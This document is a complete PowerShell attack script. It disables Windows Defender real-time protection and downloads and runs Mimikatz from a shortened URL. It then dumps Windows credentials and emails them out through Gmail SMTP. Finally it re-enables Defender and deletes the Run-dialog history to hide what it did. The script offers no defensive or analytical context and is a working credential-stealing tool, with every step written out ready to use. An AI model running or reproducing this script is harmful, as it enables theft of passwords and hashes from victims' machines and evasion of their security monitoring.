New-Variable Mimikatz_Dump
Set-MpPreference -DisableRealtimeMonitoring $True

Function Send-Email {
try {
    $Email_Sender = '*******@gmail.com'
    $Email_SenderPassword = '***********'
    $Email_SenderSMTP = 'smtp.gmail.com'
    $Email_SenderSMTPPort = '587'
    $Email_Recipient = '******@email.com'
    $Email_Subject = 'Mimikatz Report'
    $Email_Body = "$log`n`n`n`n`n$Mimikatz_Dump"

    $Email_Credential = New-Object System.Management.Automation.PSCredential ($Email_Sender, (ConvertTo-SecureString $Email_SenderPassword -AsPlainText -Force))

    Send-MailMessage `
    -SmtpServer $Email_SenderSMTP -Port $Email_SenderSMTPPort -credential $Email_Credential -UseSSL `
    -From $Email_Sender `
    -To $Email_Recipient `
    -Subject $Email_Subject `
    -Body $Email_Body
}
catch {
    Write-Error "Email failed to send"
    break
}
}

$log = "Info : Fetching Mimikatz"
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI')

$Mimikatz_Debug = Invoke-Mimikatz -Command privilege::debug | Out-String -Stream
If ([bool](Select-String -InputObject $Mimikatz_Debug "Privilege `'20`' OK" -Quiet) -eq $False) {
    $log += "`nError: Privileges not sufficient to run Mimikatz"
    $log += "`nInfo : Error message is:"
    $log += "`n`n$Mimikatz_Debug"
    Send-Email
    break
} elseif ([bool]($Mimikatz_Debug | Select-String "Privilege `'20`' OK" -Quiet) -eq $True) {
    $log += "`nInfo : Privileges sufficient.  Running Mimikatz."
    $Mimikatz_Dump = Invoke-Mimikatz -DumpCreds
    Send-Email
    break
}

## Cleanup
Set-MpPreference -DisableRealtimeMonitoring $False
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Exit